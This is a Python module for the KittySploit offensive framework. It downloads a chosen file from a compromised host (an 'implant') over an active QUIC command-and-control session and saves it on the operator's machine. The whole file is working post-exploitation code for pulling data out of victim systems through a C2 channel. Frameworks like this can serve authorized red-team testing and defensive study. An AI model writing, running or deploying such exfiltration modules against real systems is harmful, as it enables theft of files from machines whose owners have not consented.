#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os

from kittysploit import *
from core.framework.failure import FailureType, ProcedureError
from lib.protocols.quic.quic_session_mixin import QuicSessionMixin


class Module(Post, QuicSessionMixin):
    """Download a file from a QUIC implant session."""

    __info__ = {
        "name": "QUIC Download File",
        "description": "Download a remote file from the implant via an active QUIC C2 session",
        "author": "KittySploit Team",
        "session_type": SessionType.QUIC,
    }

    remote_path = OptString("", "Remote file path on the implant", True)
    local_file = OptString("", "Local path to save the downloaded file", True)

    def check(self):
        if not self._session_is_quic():
            print_error("This module requires an active QUIC session")
            return False
        if not str(self.remote_path).strip():
            print_error("remote_path is required")
            return False
        if not str(self.local_file).strip():
            print_error("local_file is required")
            return False
        try:
            self.open_quic()
            return True
        except ProcedureError as exc:
            print_error(str(exc))
            return False

    def run(self):
        remote = str(self.remote_path).strip()
        local_path = os.path.abspath(str(self.local_file).strip())
        os.makedirs(os.path.dirname(local_path) or ".", exist_ok=True)

        print_status(f"Downloading {remote} -> {local_path}")
        client = self.open_quic()
        result = client.download(remote, local_path)
        if not os.path.isfile(local_path):
            raise ProcedureError(FailureType.Unknown, result or "Download failed")
        print_success(result)
        return True
